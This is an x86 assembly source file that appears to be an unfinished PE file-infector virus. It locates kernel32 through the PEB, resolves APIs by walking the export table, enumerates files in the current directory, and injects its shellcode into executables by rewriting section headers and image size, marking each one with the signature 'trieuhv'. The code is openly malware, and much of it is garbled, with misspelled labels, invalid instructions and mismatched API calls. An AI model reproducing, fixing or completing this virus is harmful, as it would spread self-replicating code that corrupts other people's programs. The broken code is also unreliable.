.586p
.model flat, stdcall
extern VirtualProtect@16 NEAR
_DATA segment
temp dword ?
_DATA ends
_TEXT segment
START :
push offset temp
push 40h
mov eax, offset endShellCode
mov ebx, offset startShellCode
sub eax, ebx
push eax
mov eax, offset startShellCode
push eax
call VirtualProtect@16

startShellCode:
call make
make :
pop eax
sub eax, offset make
mov[offset delta + eax], eax
mov esi, eax

codeStart :

pop eax
push 
and eax, 0ffff000h
findKernel32 :
cmp word ptr[eax], "ZM"
jne findContinues
mov edi, [eax, 3ch]
add edi, eax
mov ebx, [edi]
cmp ebx, "EP"
je findedKernel32
findContinues :

push esi
xor eax, eax
mov eax, fs : [eax + 30h]
test eax, eax
js find_kernel32_9x
find_kernel32_nt :
mov eax, [eax + 0ch]
mov eax, [eax + 1ch]
mov eax, [eax]
mov eax, [eax + 08h]
jmp find_kernel32_finished
find_kernel32_9x :
mov eax, [eax + 43h]
lea eax, [eax + 7ch]
mov eax, [eax + 3ch]
find_kernel32_finished :
	pop esi

	sub eax, 10000h
	jmp findKernel32
	findedKernel32 :
mov[VAImageBaseKernel + esi], eax
mov[VAEsignatureInMem + esi], edi
mov ebx, [edi + 78h]
mov ecx, [edi + 43h]
sub eax, ecx
add ebx, ecx
add ebx, eax
mov[VAExportTableInMem + esi], ebx
mov edi, ebx
mov ebx, [edi + 28]
add ebx, [ImageBase + esi]
mov[VAEAT + esi], ebx
mov ebx, [edi + 32]
add ebx, [ImageBase + esi]
mov[VAENT + esi], ebx
mov ebx, [edi + 36]
add ebx, [ImageBase + esi]
mov[VAEOT + esi], ebx
mov eax, [VAENT + esi]
sub eax, 4
mov edx, [VAEOT + esi]
sub edx, 2
findFuncName:
add edx, 2
add eax, 4
mov ebx, [eax]
add ebx, [ImageBase + esi]
mov ecx, [ebx]

cmp ecx, "PteG"
je lable1
jmp findFuncName
lable1 :
mov ecx, [ebx + 4]
cmp ecx, "Acor"
je lable2
jmp finFuncName
lable2 :
mov ecx, [edx + 8]
cmp ecx, "erdd"
je lable3
jmp findFuncName
lable3 :
xor ecx, ecx
mov cx, word ptr[ebx + 12]
cmp cx, "ss"
je endFind
jmp findFuncName
endFind :
mov cx, word ptr[edx]
mov edx, [VAEAT + esi]
findAddress :
	add edx, 4
	loop findAddress
	mov edx, [edx]
	add edx, [ImageBase]
	mov[func_GetProcAddress + esi], edx
	mov eax, offset LoadLibraryA
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_GetProcAddress + esi]
	mov[func_LoadLibraryA + esi], eax

	mov eax, offset ReadFile
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_GetProcAddress + esi]
	mov[func_ReadFile + esi], eax

	mov eax, offset MessageBox
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_MessageBox + esi], eax

	mov eax, offset FindFirstFileA
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_FindFirstFileA], eax

	mov eax, offset FindNextFileA
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_FindFirstFileA], eax

	mov eax, offset WriteFile
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_WriteFile], eax

	mov eax, offset lstrcmp
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_WriteFile], eax

	mov eax, offset SetFilePointer
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_SetFilePointer], eax

	mov eax, offset CloseHandle
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_CloseHandle], eax

	mov eax, offset ReadFile
	add eax, esi
	push eax
	push[ImageBase + esi]
	call[func_CLoseHandle], eax

	push[oldEP + esi]
	push[newEP + esi]
	call searchFile
	searchFile proc
	pushad
	mov eax, offset findData
	add eax, esi
	push eax
	mov eax, offset pathFile
	add eax, esi
	push eax
	call[func_FindFirstFileA + esi]
	mov[hFindFile + esi], eax
	jmp fileFirst
	findFile :
mov eax, offset findData
add eax, esi
push eax
push[hFindFile + esi]
call[func_FindNextFileA + esi]
cmp eax, 0
je endFindFile
firstFile :
cmp dword ptr[FindData + esi], 10h
je findFile
cmp dword ptr[findData + esi], 20h
jne failFile
call injectCode
failFile :
jmp findFile
endFindFile :
popad
ret
searchFile endp
injectCode proc
pushad
push 0
push 20h
push 3
push 0
push 1
push 0C0000000h
mov eax, offset findData + 44
add eax, esi
push eax
call[func_CreateFile + esi]
mov[hFile + esi], eax
cmp eax, -1
je endInjectCode
mov[Signature + esi], 0
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 2
mov eax, offset Signature
add eax, esi
push eax
push[hFile + esi]
call[func_ReadFile + esi]
mov eax, 0
mov ax, word ptr[offset Signature + esi]
cmp eax, 5a4dh
jne endInjectCode

mov[shellcodeSize + esi], offset endShelCode - offset startShellCode
push 0
push 0
push 3ch
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset byteRead
add eax, esi
push eax, offset numByteRead
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFile + esi]
call[func_ReadFile + esi]

Inject:
push[nameFile + esi]
push c00000000h
push 1
push 0
push 3
push 20
push 0
call[func_CreateFile + esi]
push[hFile + esi]
push[buff save + esi]
push[numByteReaded + esi]
push[overlapped + esi]
call[ReadFile]

mov[Characteristics + esi], 0E0000040h

mov eax, [shellcodeSize + esi]
mov edx, 0
div[FileAlignment + esi]
mov eax
sub eax, edx
add[RawSize + esi], eax
mov[numOfByteToFill + esi], eax
mov eax, [RawSize + esi]
mov[VirtualSize + esi], eax

push 1
push 0h
push - 32
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset byteWritten
add eax, esi
push eax
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

push 2
push 0
push 0
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset byteWritten
add eax, esi
push eax
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]
mov eax, offset byteWritten

push 0
push 0
push 32
push[hFile + esi]
call[func_SetFilePointer + esi]
push 0
mov eax, offset byteWritten
add eax, esi
push eax
push 32
mov eax, offset RawSize
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

push 0
push 0
push 32
push[hFile + esi]
call[func_SetFilePointer + esi]
push 0
mov eax, offset byteWritten
add eax, esi
push eax
push 32
mov eax, offset SizeOfImage
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]


data_ :
byteZero db 0
msg db "Hello world!", 0
delta dword ?
GetProcAddress dword ?
user32 db "user32.dll", 0
dll_user32 dword ?
MessageBoxA db "MessageBoxA", 0
func_MessageBoxA dword ?
VirtualProtect db "VirtualProtect", 0
func_VirtualProtect dword ?
CreateFile db "CreateFile", 0
func_CreateFile dword ?
WriteFile db "WriteFile", 0
func_WriteFile dword ?
SetFilePointer db "SetFilePointer", 0
func_SetFilePointer dword ?
CloseHandle db "CloseHanlde", 0
func_CloseHanlde dword ?
lstrcmp db "lstrcmp", 0
func_lstrcmp dword ?
FindFisrtFileA db "FindFirstFile", 0
func_FindFisrtFileA dword ?
FindNextFileA db "FindNextFileA", 0
func_FindNextFileA dword ?
ImageBase dword ?
Signature dword ?
VAEAT dword ?
shellcodeSize dword ?
fileSize dword ?
hFileOld dword ?
oldPesignature dword ?
oldSizeofImage dword ?
newSizeofImage dword ?
oldEP dword ?
newEP dword ?
NumberOfSection dword ?
SectionAlignment dword ?
FileAlignment dword ?
VirtualSize dword ?
VirtualAddress dword ?
RawSize dword ?
RawAddress dword ?
Free db 12 dup(? )
Characteristics dword ?
numOfByteToFill dword ?
byteWritten dword ?
numByteRead dword ?
hFindFile dword ?
pathFile db ".\*.*", 50 dup(0)
finData db 592 dup(? ), 0
Signature db "trieuhv", 0
